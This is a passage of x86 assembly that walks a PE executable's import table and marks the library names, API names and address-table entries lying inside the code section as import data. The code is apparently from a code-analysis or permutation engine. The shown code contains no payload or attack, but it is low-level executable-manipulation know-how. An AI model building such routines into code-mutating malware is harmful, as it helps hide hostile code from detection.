	add eax, [map]	; eax -> entry in lookup table

__mark_apinames:
	pushad
	mov eax, [eax]
	call _mark1
	inc eax
	call _mark1
	inc eax
	call _marktozero
	popad
	add eax, 4
	cmp 4 ptr [eax], 0
	jnz __mark_apinames

__6784:
	; 2. library name
	mov eax, [esi].im_librarynamerva
	call _intocode
	jz __6785
	call _marktozero

__6785:	
	; 3. address table	
	mov eax, [esi].im_addresstablerva
	call _intocode
	jz __6786
	call _marktozero4
__6786:
	; end of cycle
	add esi, im_size
	cmp 4 ptr [esi], 0
	jnz __mark_dllentries
		
__674:
	popad
	ret

_mark1:	; marks 1 byte of code
	; eax =  RVA
	pushad
	mov ecx, [accbuf]
	sub eax, [codebase]
	jl __42
	cmp eax, [codesize]
	jge __42
	or 1 ptr [ecx+eax], IMPORT_ACCESS
__42:
	popad
	ret

_mark4:	; marks 4 bytes of code
	; eax =  RVA
	pushad
	mov ecx, [accbuf]
	sub eax, [codebase]
	jl __43
	cmp eax, [codesize]
	jge __43
	or 1 ptr [ecx+eax], IMPORT_ACCESS
	or 1 ptr [ecx+eax+1], IMPORT_ACCESS
	or 1 ptr [ecx+eax+2], IMPORT_ACCESS
	or 1 ptr [ecx+eax+3], IMPORT_ACCESS
__43:
	popad
	ret

_marktozero:	; marks code to zero
	; eax =  RVA
	pushad
	mov ecx, [accbuf]
	sub eax, [codebase]
	jl __45
	cmp eax, [codesize]
	jge __45
	mov esi, [codesize]
	sub esi, eax
	mov edx, [codebuf]
	cmp 1 ptr [edx+eax], 0
	jz __45
__scan0:	
	or 1 ptr [ecx+eax], IMPORT_ACCESS
	dec esi
	jz __45
	inc eax
	cmp 1 ptr [edx+eax], 0
	jnz __scan0
__45:
	popad
	ret

_marktozero4:	; marks code to 4 zeros
	; eax =  RVA
	pushad
	mov ecx, [accbuf]
	sub eax, [codebase]
	jl __46
	cmp eax, [codesize]
	jge __46
	mov esi, [codesize]
	sub esi, eax
	mov edx, [codebuf]
	cmp 4 ptr [edx+eax], 0
	jz __46
__scan1:	
	or 1 ptr [ecx+eax], IMPORT_ACCESS
	dec esi
	jz __46
	inc eax
	cmp 4 ptr [edx+eax], 0
	jnz __scan1
__46:
	popad
	ret

_intocode:
; check if eax [RVA]-> into CODE section
	pushad
	mov ecx, eax
	sub ecx, [codebase]
	jl __3432
	sub ecx, [codesize]
	jge __3432
	sub eax, eax
	inc eax
	popad
	ret
__3432:
	sub eax, eax
	popad
	ret


IMPORT_ACCESS	equ 	1
;READ_ACCESS	equ 	2	; not realised yet
;WRITE_ACCESS	equ	4